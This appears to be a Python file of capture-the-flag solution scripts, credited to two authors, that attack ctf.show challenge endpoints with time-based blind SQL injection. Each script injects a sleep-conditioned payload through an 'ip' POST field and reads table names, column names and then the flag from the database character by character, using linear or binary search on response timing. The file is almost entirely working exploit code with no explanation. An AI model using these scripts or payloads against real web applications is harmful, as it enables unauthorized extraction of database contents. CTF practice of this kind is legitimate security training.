"""
Author:Y4tacker
"""
import requests
import time

#
# url = "http://ee30e01c-b9d8-4dfd-a3da-b959eff321c4.chall.ctf.show:8080/api/index.php"
#
# result = ""
# i = 0
# while True:
#     i = i + 1
#     head = 32
#     tail = 127
#
#     while head < tail:
#         mid = (head + tail) >> 1
#         # 查数据库
#         # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
#         # 查列名字-id.flag
#         # payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'"
#         # 查数据
#         payload = "select flaga from ctfshow_flagx"
#         data = {
#             'ip': f"if(ascii(substr(({payload}),{i},1))>{mid},sleep(1),1)",
#             'debug':'0'
#         }
#         print(data['ip'])
#         try:
#             r = requests.post(url, data=data, timeout=1)
#             tail = mid
#         except Exception as e:
#             head = mid + 1
#
#     if head != 32:
#         result += chr(head)
#     else:
#         break
#     print(result)


url = "http://9c4f519f-a56e-40d8-aa67-6199876a350e.chall.ctf.show:8080/api/index.php"
session = requests.Session()
result = ""
for i in range(1, 41):
    for j in range(32, 127):
        # 查数据库
        # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        # result=ctfshow_flagx,ctfshow_inf
        # 查列名字-id.flag
        # payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'"
        # result=id,flaga,inf
        # 查数据
        payload = "select group_concat(flaga) from ctfshow_flagx"
        data = {
            'ip': f"if(ascii(substr(({payload}),{i},1))={j},sleep(4),1)",
            'debug': '0'
        }
        print(data['ip'])
        try:
            time.sleep(0.2)
            r = session.post(url, data=data, timeout=4)
            print(j, chr(j))
            print(f'result={result}')
            time.sleep(0.2)
        except Exception as e:
            break
    result += chr(j)
    # print(f'result={result}')


"""
Author:feng
"""
# import requests
#
# url = 'http://205186d7-3c27-42c8-90cf-9b15eb333911.chall.ctf.show:8080/api/index.php'
#
# flag = ''
# for i in range(1, 100):
#     length = len(flag)
#     min = 32
#     max = 128
#     while 1:
#         j = min + (max - min) // 2
#         if min == j:
#             flag += chr(j)
#             print(flag.lower())
#             break
#
#         # payload="if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'),{},1))<{},sleep(0.5),1)".format(i,j)
#         payload = "if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),{},1))<{},sleep(1),1)".format(i, j)
#
#         data = {
#             'ip': payload,
#             'debug': 0
#         }
#         try:
#             time.sleep(0.2)
#             r = requests.post(url=url, data=data, timeout=1)
#             min = j
#         except:
#             max = j

"""
Author:feng
"""
# import requests
# from time import time
#
# url = 'http://9c4f519f-a56e-40d8-aa67-6199876a350e.chall.ctf.show:8080/api/index.php'
#
# flag = ''
# for i in range(1, 100):
#     length = len(flag)
#     min = 32
#     max = 128
#     while 1:
#         j = min + (max - min) // 2
#         if min == j:
#             flag += chr(j)
#             print(flag.lower())
#             break
#
#         # payload="if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'),{},1))<{},sleep(0.5),1)".format(i,j)
#         payload = "if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),{},1))<{},sleep(0.5),1)".format(i, j)
#
#         data = {
#             'ip': payload,
#             'debug': 0
#         }
#         start_time = time()
#         r = requests.post(url=url, data=data)
#         end_time = time()
#         if end_time - start_time > 0.49:
#             max = j
#         else:
#             min = j
